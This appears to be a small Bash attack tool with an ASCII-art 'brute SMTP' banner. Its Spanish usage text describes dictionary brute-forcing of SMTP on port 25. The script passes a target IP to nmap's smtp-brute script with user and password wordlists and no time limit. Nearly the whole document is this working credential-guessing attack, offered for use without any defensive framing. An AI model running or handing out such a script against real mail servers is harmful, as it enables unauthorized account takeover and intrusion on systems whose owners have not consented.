...
;M MM M: .M        .MMMMMMMMMMMMMMMMMMMMMMMMMM,         'MM'...'M
 ...
 'MM;MMMMMMMM.MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMM
  ...
  MMM      :M  'MMMMMMMMM brute SMTP MMMMMMM'.MM  MM:M.    'MMMMM
...
if [ -z "$1" ]; then
        echo
        echo "Fuerza bruta con diccionarios a SMTP en puerto por defecto 25/TCP."
        echo "Requiere nmap"
        echo "Uso.: sh brutesmtp.sh <ip>"
        echo
        exit 0
fi
echo
echo
nmap -Pn $1 -p 25 --script smtp-brute  --script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0
